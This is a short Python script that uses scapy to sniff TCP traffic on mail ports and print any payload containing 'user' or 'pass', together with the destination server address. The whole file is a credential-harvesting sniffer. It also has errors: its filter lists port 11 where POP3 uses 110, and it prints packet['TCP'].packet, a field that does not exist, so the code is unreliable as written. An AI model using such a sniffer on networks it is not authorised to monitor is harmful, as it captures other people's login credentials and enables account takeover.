from scapy.all import *


def packet_callback(packet):
    if packet['TCP'].payload:

        mail_packet = str(packet['TCP'].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet['IP'].dst)
            print("[*] %s" % packet['TCP'].packet)


# filter is a wireshark type filter that specifies what packets are sniffed
# iface tells the sniffer which net work interface to sniff on
# prn specifies the function called on each packet object
# count specifies how many packets you want to sniff
# store 0 means it wont store the data and so can run forever
sniff(filter="tcp port 11 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
